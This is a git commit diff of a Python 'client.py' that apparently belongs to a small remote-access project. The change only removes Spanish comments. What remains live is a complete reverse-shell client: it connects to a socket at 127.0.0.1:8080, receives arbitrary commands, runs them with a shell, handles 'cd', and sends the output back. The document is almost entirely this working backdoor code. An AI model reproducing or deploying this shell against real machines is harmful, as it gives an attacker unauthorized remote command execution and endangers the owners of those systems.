9bebe52e48313f7c77a2e575768733d46a84709f
0rodrizdev <rodriguezaza710@gmail.com>
2024-10-07 11:21:41 -0300

    Update client.py

--- client.py
+++ client.py
@@ -6,32 +6,32 @@ class Client:
     def __init__(self):
         global client
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client.connect(("127.0.0.1", 8080))  # Usa 127.0.0.1 si es localhost
+        client.connect(("127.0.0.1", 8080))  # 127.0.0.1 localhost
 
     def shell(self):
-        currentDir = os.getcwd()  # Obtener el directorio actual
-        client.send(currentDir.encode())  # Enviar el directorio actual codificado
+        currentDir = os.getcwd()  
+        client.send(currentDir.encode())  
         
         while True:
-            cmd = client.recv(1024).decode()  # Recibir comando y decodificar
+            cmd = client.recv(1024).decode()  
             
             if cmd == "exit()":
                 break
 
             elif cmd[:2] == "cd":
                 try:
-                    os.chdir(cmd[3:])  # Cambiar de directorio
+                    os.chdir(cmd[3:]) 
                     currentDir = os.getcwd()
-                    client.send(currentDir.encode())  # Enviar el nuevo directorio
+                    client.send(currentDir.encode())  
                 except FileNotFoundError as e:
-                    client.send(str(e).encode())  # Enviar error si el directorio no existe
+                    client.send(str(e).encode())  
             
             else:
                 process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output = process.stdout.read() + process.stderr.read()
-                client.send(output)  # Enviar la salida del comando
+                client.send(output)  
 
-# Crear una instancia del cliente y ejecutar el método shell
+
 client_instance = Client()
 client_instance.shell()
 
